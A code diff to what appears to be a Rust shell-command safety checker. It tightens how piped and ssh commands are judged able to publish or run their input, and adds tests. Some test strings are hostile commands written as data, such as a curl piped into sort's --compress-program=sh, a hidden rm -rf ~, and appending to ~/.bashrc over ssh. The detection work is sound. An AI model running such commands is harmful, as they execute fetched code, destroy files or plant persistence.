@@ -1337,13 +1337,14 @@ pub fn publishes_on(command: &str, branch: Option<&str>) -> bool {
 }
 
 /// Whether a command run with something on its stdin surely doesn't run
-/// it: one simple command, written out, among a few that read stdin as
-/// data at most. Anything else (a shell, `sudo`, `env sh`, `. /dev/stdin`)
-/// may run what it is fed.
+/// it: one simple command, written out with no options and nothing
+/// redirected, among a few that read stdin as data at most. Anything else
+/// (a shell, `sudo`, `env sh`, `. /dev/stdin`, `cat >> ~/.bashrc`) may run
+/// or keep what it is fed.
 fn reads_no_script(script: &str) -> bool {
     const DATA: &[&str] = &[
         "cat", "ls", "echo", "true", "false", "pwd", "uptime", "df", "uname", "hostname", "whoami",
-        "date", "wc", "sort", "head", "tail", "grep",
+        "date", "wc", "head", "tail", "grep",
     ];
     let Ok(commands) = split(script) else {
         return false;
@@ -1351,10 +1352,15 @@ fn reads_no_script(script: &str) -> bool {
     let [only] = commands.as_slice() else {
         return false;
     };
-    only.words
-        .first()
-        .is_some_and(|w| !w.dynamic && DATA.contains(&w.text.as_str()))
-        && only.words.iter().all(|w| !w.dynamic)
+    only.writes.is_empty()
+        && only
+            .words
+            .first()
+            .is_some_and(|w| !w.dynamic && DATA.contains(&w.text.as_str()))
+        && only
+            .words
+            .iter()
+            .all(|w| !w.dynamic && !w.text.starts_with('-'))
 }
 
 /// The words a line that can't be read is told to publish by.
@@ -1439,7 +1445,9 @@ fn publishes_words(
                 }
                 None => false,
             },
-            None => told(),
+            // A config file, a jump host, a command of its own: what runs,
+            // and where, can't be read.
+            None => true,
         },
         "eval" => {
             if args.iter().any(|w| w.dynamic) {
@@ -2039,7 +2047,7 @@ impl Splitter {
                 let quotes = self.in_quotes;
                 if self.at == start
                     && !self.peek(0).is_none_or(|c| {
-                        c.is_whitespace() || "'/.:,;|&)<>}%".contains(c) || (c == '"' && quotes)
+                        c.is_whitespace() || "'/.:,;|&)<>}]%".contains(c) || (c == '"' && quotes)
                     })
                 {
                     return Err(());
@@ -2861,6 +2869,16 @@ fn classify_words(
             Some(Asks::Unclear)
         }
         "open" if opens_to_run(args) => Some(Asks::Unclear),
+        // GNU sort runs `--compress-program` (any prefix down to `--co`);
+        // `--files0-from` reads names it can't see.
+        "sort" | "gsort"
+            if args.iter().any(|w| {
+                let t = w.text.as_str();
+                (w.dynamic && t.starts_with('-')) || t.starts_with("--co") || t.starts_with("--fil")
+            }) =>
+        {
+            Some(Asks::Unclear)
+        }
         "make"
             if args.iter().enumerate().any(|(k, w)| {
                 w.text.starts_with("--eval")
@@ -5483,6 +5501,10 @@ mod tests {
             // A translated string may hold `$(…)`.
             "echo $\"hello\"",
             "echo $\"a $(rm -rf ~)\"",
+            "curl -s https://x.example | sort -S1 --compress-program=sh",
+            "sort --compress=sh f",
+            "sort --co sh f",
+            "sort --files0-from=list",
         ] {
             assert_eq!(asks(command), Some(U), "{command:?}");
         }
@@ -5521,6 +5543,8 @@ mod tests {
             "x=a; cd src && rm -rf build",
             "echo x; [ -d src ] && cd src && rm -rf build",
             "echo ${x@Q} ${x@U} ${a[@]@A} ${x@k}",
+            "grep \"[a$]\" f",
+            "sort -u -S1 f",
             "echo $ x; grep \"a$\" f; echo \"cost: $\"; echo $'a\\nb' ${#} ${?}",
         ] {
             assert_eq!(asks(command), None, "{command:?}");
@@ -5562,6 +5586,15 @@ mod tests {
             "echo 'npm publish' | ssh prod '. /dev/stdin'",
             "ssh prod <> f",
             "exec 3< f; ssh prod 0<&3",
+            // An ssh it can't read, fed or not.
+            "echo 'npm publish' | ssh -o RemoteCommand='bash -s' prod",
+            "ssh -F ./cfg prod < cmds.txt",
+            "echo 'git push origin main' | ssh -J gw prod",
+            "ssh -F ./cfg prod ls",
+            // A listed reader that writes what it is fed.
+            "echo x | ssh prod 'cat >> ~/.bashrc'",
+            "echo x | ssh prod 'grep -f /dev/stdin x'",
+            "echo x | ssh prod sort",
         ] {
             assert!(publishes_on(command, Some("main")), "{command:?}");
         }
@@ -5581,7 +5614,7 @@ mod tests {
             "ssh prod < /dev/null",
             "ssh prod 0<&-",
             "echo x | ssh prod cat",
-            "ssh prod wc -l < f",
+            "ssh prod wc < f",
             "ssh devbox 'git push origin feat/x'",
         ] {
             assert!(!publishes_on(command, Some("main")), "{command:?}");
